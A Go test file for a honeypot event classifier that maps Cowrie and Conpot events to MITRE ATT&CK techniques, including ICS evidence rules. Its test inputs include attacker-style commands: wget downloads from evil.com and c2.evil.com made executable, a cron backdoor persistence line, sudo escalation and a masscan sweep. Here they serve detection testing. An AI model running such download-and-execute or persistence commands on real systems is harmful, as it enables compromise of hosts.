package intelligence

import (
	"context"
	"sync"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

// ---- helpers ----

func makeEvent(honeypot, eventType, command, username string) *database.Event {
	return &database.Event{
		Timestamp: time.Now().UTC(),
		Honeypot:  honeypot,
		EventType: eventType,
		Command:   command,
		Username:  username,
		SourceIP:  "1.2.3.4",
	}
}

// newTestClassifierT creates a classifier whose ATT&CK loader uses t.TempDir().
func newTestClassifierT(t *testing.T) *Classifier {
	t.Helper()
	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	ttpBuilder := NewTTPBuilder(30 * time.Minute)
	return NewClassifier(loader, ttpBuilder)
}

// ---- rule compilation ----

func TestDefaultRulesCompile(t *testing.T) {
	rules := DefaultRules()
	if len(rules) == 0 {
		t.Fatal("DefaultRules returned empty slice")
	}
	compiled := compileRules(rules)
	if len(compiled) != len(rules) {
		t.Errorf("compileRules dropped rules: got %d, want %d", len(compiled), len(rules))
	}
}

func TestDefaultRulesSortedByPriority(t *testing.T) {
	rules := DefaultRules()
	for i := 1; i < len(rules); i++ {
		if rules[i].Priority > rules[i-1].Priority {
			t.Errorf("rules not sorted at index %d: priority %d > %d",
				i, rules[i].Priority, rules[i-1].Priority)
		}
	}
}

func TestAllStaticRulesHaveConfidence(t *testing.T) {
	for _, r := range DefaultRules() {
		if r.Confidence == 0 {
			t.Errorf("rule %q has zero confidence", r.TechniqueID)
		}
	}
}

// ---- classification ----

func TestClassifyBruteForceSSH(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("cowrie", "login_failed", "", "root")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T1110" {
		t.Errorf("expected T1110, got %q", ev.TechniqueID)
	}
	if ev.KillChainStage != "initial-access" {
		t.Errorf("expected initial-access kill chain, got %q", ev.KillChainStage)
	}
	if !ev.Classified {
		t.Error("event should be marked classified")
	}
}

func TestClassifyIngressToolTransfer(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("cowrie", "command", "wget http://evil.com/malware.sh -O /tmp/x && chmod +x /tmp/x", "root")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T1105" {
		t.Errorf("expected T1105, got %q", ev.TechniqueID)
	}
}

func TestClassifyPrivilegeEscalation(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("cowrie", "command", "sudo su root", "attacker")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T1548.003" || ev.TacticID != "TA0004" {
		t.Errorf("sudo: expected T1548.003 (TA0004), got %q %q", ev.TechniqueID, ev.TacticID)
	}
	ev = makeEvent("cowrie", "command", "su -", "attacker")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T1548" {
		t.Errorf("su: expected T1548, got %q", ev.TechniqueID)
	}
}

func TestClassifyPersistence(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("cowrie", "command", "crontab -e && echo '* * * * * /tmp/backdoor'", "root")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T1053.003" || ev.TacticID != "TA0003" {
		t.Errorf("expected T1053.003 (TA0003), got %q %q", ev.TechniqueID, ev.TacticID)
	}
}

func TestClassifySystemInfoDiscovery(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("cowrie", "command", "uname -a", "root")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T1082" {
		t.Errorf("expected T1082, got %q", ev.TechniqueID)
	}
}

func TestClassifyICSCommand(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("conpot", "command", "WRITE_COIL 1 1", "")
	c.Classify(context.Background(), ev)
	// T0855 Unauthorized Command Message was revoked for T1692.001.
	if ev.TechniqueID != "T1692.001" || ev.TacticID != "TA0106" {
		t.Errorf("expected T1692.001 (Command Message, TA0106), got %q %q", ev.TechniqueID, ev.TacticID)
	}
}

// Connection establishment and normal protocol reads do not establish network
// connection enumeration (T0840) or point/tag identification (T0861). A read
// of coils or registers reads the process state (T0801, collection); a bare
// connection is one knock, its category's scanning on thin evidence; only a
// request that asks what the device is names discovery (T0888). None of them
// is certain.
func TestClassifyICSEvidenceLimits(t *testing.T) {
	c := newTestClassifierT(t)
	for _, tc := range []struct {
		eventType, protocol, function, profile string
		technique, tactic                      string
		maxConf                                float64
	}{
		{"connection", "modbus", "", "plc_modbus", "T1595", "TA0043", 0.5},
		{"conpot.modbus.new_connection", "modbus", "", "plc_modbus", "T1595", "TA0043", 0.5},
		{"conpot.http.new_connection", "http", "", "", "T1595", "TA0043", 0.5},
		{"conpot.modbus.read", "modbus", "3", "plc_modbus", "T0801", "TA0100", 0.6},
		{"conpot.opcua.read", "opcua", "", "beckhoff_cx", "T0801", "TA0100", 0.6},
		{"conpot.modbus.read", "modbus", "43", "plc_modbus", "T0888", "TA0102", 0.7},
		{"conpot.modbus.read", "modbus", "17", "plc_modbus", "T0888", "TA0102", 0.7},
		{"conpot.modbus.request", "modbus", "8", "plc_modbus", "T0888", "TA0102", 0.6},
		{"conpot.modbus.request", "modbus", "", "", "T0888", "TA0102", 0.6},
		{"conpot.modbus.connection_closed", "modbus", "", "plc_modbus", "", "", 0},
		// Not one of conpot's named probes, but its category is scanning.
		{"conpot.modbus.probe.invalid", "modbus", "", "plc_modbus", "T1595", "TA0043", 0.5},
	} {
		t.Run(tc.eventType+"/"+tc.function, func(t *testing.T) {
			ev := makeEvent("conpot", tc.eventType, "", "")
			ev.Protocol = tc.protocol
			ev.Metadata = map[string]string{"function_code": tc.function, "device_profile": tc.profile}
			c.Classify(context.Background(), ev)
			if ev.TechniqueID != tc.technique || ev.TacticID != tc.tactic {
				t.Errorf("technique %q tactic %q, want %q %q", ev.TechniqueID, ev.TacticID, tc.technique, tc.tactic)
			}
			if ev.Confidence > tc.maxConf {
				t.Errorf("confidence %v above %v for single-event evidence", ev.Confidence, tc.maxConf)
			}
			if tc.technique != "" && ev.TacticName == "" {
				t.Errorf("no tactic name: %+v", ev)
			}
		})
	}
}

func TestClassifyICSExplicitProbeIsDiscoveryCandidate(t *testing.T) {
	c := newTestClassifierT(t)
	for _, eventType := range []string{"probe", "conpot.http.probe", "conpot.modbus.probe"} {
		t.Run(eventType, func(t *testing.T) {
			ev := makeEvent("conpot", eventType, "", "")
			c.Classify(context.Background(), ev)
			if ev.TechniqueID != "T0846" || ev.TechniqueName != "Remote System Discovery" || ev.TacticID != "TA0102" || !ev.Classified {
				t.Errorf("probe candidate metadata: %+v", ev)
			}
			if ev.Confidence != 0.5 {
				t.Errorf("single probe confidence = %v, want candidate confidence 0.5", ev.Confidence)
			}
		})
	}
}

// A write is an attempted command message whatever the device answered
// (T1692.001, which replaced the revoked T0855).
func TestClassifyICSWriteAttemptIsCommandMessage(t *testing.T) {
	c := newTestClassifierT(t)
	for _, response := range []string{"accepted", "illegal_data_address", "unknown"} {
		t.Run(response, func(t *testing.T) {
			ev := makeEvent("conpot", "conpot.modbus.command", "", "")
			ev.Metadata = map[string]string{"function_code": "6", "response": response}
			c.Classify(context.Background(), ev)
			if ev.TechniqueID != "T1692.001" || ev.Confidence >= 1 {
				t.Errorf("write attempt mapping = %q (confidence %v), want T1692.001 below certainty", ev.TechniqueID, ev.Confidence)
			}
		})
	}
}

func TestICSFallbackTechniqueMetadata(t *testing.T) {
	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	for id, name := range map[string]string{
		"T0840": "Network Connection Enumeration",
		"T0846": "Remote System Discovery",
	} {
		tech, ok := loader.Get(id)
		if !ok {
			t.Fatalf("missing embedded ICS technique %s", id)
		}
		if tech.Name != name || tech.ID != id || tech.SubID != id || tech.URL != "https://attack.mitre.org/techniques/"+id+"/" {
			t.Errorf("incorrect embedded ICS technique %s: %+v", id, tech)
		}
		if len(tech.TacticIDs) != 1 || tech.TacticIDs[0] != "TA0102" || len(tech.TacticNames) != 1 || tech.TacticNames[0] != "discovery" {
			t.Errorf("incorrect ICS discovery tactic %s: %+v", id, tech)
		}
	}
}

func TestClassifyDoesNotMatchWrongHoneypot(t *testing.T) {
	c := newTestClassifierT(t)
	// The ICS command rule only applies to conpot; a cowrie command event
	// is a shell command.
	ev := makeEvent("cowrie", "command", "WRITE_COIL 1 1", "")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T1059.004" {
		t.Errorf("cowrie command: %q, want T1059.004", ev.TechniqueID)
	}
}

// A connection from the internet is active scanning (reconnaissance), not
// T1046, which is service discovery from inside a network; that is what a
// scanner run in a honeypot shell gets.
func TestClassifyConnectionIsActiveScanning(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("cowrie", "connection", "", "")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T1595" || ev.TacticID != "TA0043" || ev.KillChainStage != "reconnaissance" {
		t.Errorf("connection: %q %q %q, want T1595 TA0043 reconnaissance", ev.TechniqueID, ev.TacticID, ev.KillChainStage)
	}
	ev = makeEvent("cowrie", "command", "masscan 10.0.0.0/8 -p22 --rate 10000", "root")
	c.Classify(context.Background(), ev)
	if ev.TechniqueID != "T1046" {
		t.Errorf("scan from the honeypot: %q, want T1046", ev.TechniqueID)
	}
}

func TestClassifyUnclassifiedEventLeftUnchanged(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("cowrie", "some_unknown_event_type", "", "")
	c.Classify(context.Background(), ev)
	if ev.Classified {
		t.Error("event with no matching rule should not be classified")
	}
	if ev.TechniqueID != "" {
		t.Errorf("TechniqueID should be empty, got %q", ev.TechniqueID)
	}
}

func TestClassifyConfidenceDefault(t *testing.T) {
	c := newTestClassifierT(t)
	ev := makeEvent("cowrie", "login_failed", "", "admin")
	c.Classify(context.Background(), ev)
	if ev.Confidence == 0 {
		t.Error("classified event should have non-zero confidence")
	}
	if ev.Confidence > 1.0 {
		t.Errorf("confidence should be ≤ 1.0, got %f", ev.Confidence)
	}
}

// ---- MergeRules ----

func TestMergeRulesStaticWins(t *testing.T) {
	static := []Rule{{TechniqueID: "T1234", Priority: 100, Confidence: 1.0, Conditions: []Condition{{Field: "command", Pattern: "foo"}}}}
	dynamic := []Rule{{TechniqueID: "T1234", Priority: 5, Confidence: 0.6, Conditions: []Condition{{Field: "command", Pattern: "bar"}}}}
	merged := MergeRules(static, dynamic)
	if len(merged) != 1 {
		t.Fatalf("expected 1 merged rule, got %d", len(merged))
	}
	if merged[0].Confidence != 1.0 {
		t.Errorf("static rule should win: expected confidence 1.0, got %f", merged[0].Confidence)
	}
}

func TestMergeRulesDynamicFillsGaps(t *testing.T) {
	static := []Rule{{TechniqueID: "T1234", Priority: 100, Confidence: 1.0, Conditions: []Condition{{Field: "command", Pattern: "foo"}}}}
	dynamic := []Rule{
		{TechniqueID: "T1234", Priority: 5, Confidence: 0.6, Conditions: []Condition{{Field: "command", Pattern: "bar"}}},
		{TechniqueID: "T9999", Priority: 5, Confidence: 0.6, Conditions: []Condition{{Field: "command", Pattern: "baz"}}},
	}
	merged := MergeRules(static, dynamic)
	if len(merged) != 2 {
		t.Fatalf("expected 2 merged rules, got %d", len(merged))
	}
}

func TestMergeRulesSortedByPriority(t *testing.T) {
	static := []Rule{
		{TechniqueID: "T1", Priority: 10, Confidence: 1.0, Conditions: []Condition{{Field: "command", Pattern: "a"}}},
		{TechniqueID: "T2", Priority: 50, Confidence: 1.0, Conditions: []Condition{{Field: "command", Pattern: "b"}}},
	}
	merged := MergeRules(static, nil)
	if merged[0].Priority < merged[1].Priority {
		t.Error("merged rules should be sorted descending by priority")
	}
}

// ---- batch + stress ----

func TestClassifyBatch(t *testing.T) {
	c := newTestClassifierT(t)
	events := make([]*database.Event, 200)
	for i := range events {
		switch i % 4 {
		case 0:
			events[i] = makeEvent("cowrie", "login_failed", "", "root")
		case 1:
			events[i] = makeEvent("cowrie", "command", "wget http://c2.evil.com/payload", "root")
		case 2:
			events[i] = makeEvent("cowrie", "command", "uname -a", "root")
		case 3:
			events[i] = makeEvent("cowrie", "connection", "", "")
		}
	}
	iocs := c.ClassifyBatch(context.Background(), events)
	// All events should be classified.
	for i, ev := range events {
		if !ev.Classified {
			t.Errorf("event[%d] was not classified", i)
		}
	}
	if len(iocs) == 0 {
		t.Error("ClassifyBatch should have extracted IOCs from wget and login events")
	}
}

func TestClassifyConcurrent(t *testing.T) {
	c := newTestClassifierT(t)
	const goroutines = 20
	const eventsPerGoroutine = 50

	var wg sync.WaitGroup
	wg.Add(goroutines)
	for g := 0; g < goroutines; g++ {
		go func() {
			defer wg.Done()
			for i := 0; i < eventsPerGoroutine; i++ {
				ev := makeEvent("cowrie", "login_failed", "", "admin")
				c.Classify(context.Background(), ev)
				if !ev.Classified {
					t.Errorf("concurrent classify: event not classified")
				}
			}
		}()
	}
	wg.Wait()
}
